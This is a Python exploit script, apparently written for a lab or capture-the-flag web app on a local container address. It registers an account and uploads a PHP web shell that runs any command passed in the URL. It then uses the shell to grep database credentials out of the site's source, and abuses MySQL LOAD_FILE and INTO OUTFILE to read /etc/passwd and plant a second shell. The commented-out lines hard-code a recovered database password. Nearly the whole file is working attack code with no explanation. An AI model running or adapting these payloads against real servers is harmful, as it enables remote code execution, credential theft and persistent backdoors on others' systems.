import requests
import random
import string
import re
import pymysql

HOST = '172.17.0.2'

bd_shell = b'''<pre>
                <?php
                if(isset($_GET["cmd"])){
                    echo passthru($_GET["cmd"]);
                }
                ?>
                </pre>
                <form method="GET" action="">
                <input type="text" name="cmd" />
                <input type="submit" value="submit" />
                </form>'''

def install_webshell(host=HOST):
    username = ''.join(random.sample(string.ascii_lowercase, 5))
    password = ''.join(random.sample(string.ascii_lowercase, 5))
    s = requests.Session()
    r = s.post(
        f"http://{host}/index.php?action=signup", 
        data=dict(username=username, password=password)
    )
    r = s.post(
        f"http://{host}/index.php?action=login", 
        data=dict(username=username, password=password)        
    )
    r = s.post(
        f"http://{host}/index.php?action=upload", 
        files={
            'userfile': ('backdoor.php', bd_shell
            )
        }
    )
    for line in r.text.split("\n"):
        if 'backdoor.php' in line:
            return re.findall('src="images/[^"]*backdoor\.php', line)[0][5:]

def get_sql_creds(webshell, host=HOST):
    r = requests.get(f"http://{host}/{webshell}", params=dict(cmd="grep -m 2 db_ ../index.php |tr -d '\n'"))
    for line in r.text.split("\n"):
        if 'db_username' in line:
            m = re.match('.*username = "(?P<username>[^"]*)".*password = "(?P<password>[^"]*)".*', line)
            if m:
                return m.groups()

def mysql_readfile(sql_creds, path, host=HOST):
    u,p = sql_creds
    connection = pymysql.connect(host=host, user=u, password=p, database='web')
    with connection:
        with connection.cursor() as cursor:
            cursor.execute(f"""
            SELECT LOAD_FILE("{path}");
            """)
            r = cursor.fetchone()
            if len(r) == 1:
                return r[0].decode("utf-8")

def mysql_writefile(sql_creds, path, contents, host=HOST):
    u,p = sql_creds
    connection = pymysql.connect(host=host, user=u, password=p, database='web')
    with connection:
        with connection.cursor() as cursor:
            bq = "\\'"
            cursor.execute(f"""
            SELECT '{contents.replace("'",bq)}' INTO OUTFILE "{path}";
            """)


    
def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default=HOST)
    parser.add_argument('-w', '--webshell')

    args = parser.parse_args()

    webshell = args.webshell or install_webshell(args.host)
    sql_creds = get_sql_creds(webshell, args.host)

    print(f'Webshell is {webshell}')
    print(f'Sql creds: {sql_creds}')

    #print(mysql_readfile(('web', 'webapp456--secure'), '/etc/passwd', HOST))

    # mysql_writefile(('web', 'webapp456--secure'), '/var/www/html/images/mbd4.php', 
    # """<pre><?php if(isset($_GET["cmd"])){echo passthru($_GET["cmd"]);}?></pre>""", 
    # HOST)
    # print(get_sql_creds('images/mbd4.php', HOST))

if __name__ == '__main__':
    main()
